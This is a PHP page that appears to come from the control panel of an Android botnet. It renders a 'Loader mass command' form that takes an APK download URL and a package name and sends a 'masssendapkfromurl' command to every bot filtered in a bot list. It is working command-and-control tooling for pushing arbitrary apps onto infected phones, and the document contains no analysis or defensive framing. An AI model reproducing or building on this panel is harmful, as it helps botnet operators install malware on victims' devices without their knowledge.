<?php
	include "config.php";
	
	print_header();
	
	print_menu();
	
	
	$html .= "
	
	
	
	<div class=\"row\">
    <div class=\"col-lg-6\">
    <h5>Mass load apk</h5>
	 <form action=\"ajax.php\" method=post>
	    <input type=hidden name=op value=setmasscommand>
		<input type=hidden name=cod[] value=masssendapkfromurl>
		<div class=\"form-group\">
		  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"Enter url to apk , example : http://site.ru/new.apk\" name=\"url\">
		</div>
		<div class=\"form-group\">
		  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"Enter pkg name\" name=\"pkg\">
		</div>
		<button type=\"submit\" class=\"btn btn-primary\">Upload!</button> <strong><font color=red>Warning</font>, sms sended from all bots who filter in <a href=list.php>list</a></strong>
	  </form>
	  </div>
	  <div class=\"col-lg-6\"></div>
	  
	  
	  </div>

	";
	
	print_content("Loader mass command	",$html);
	
	print_footer();

?>

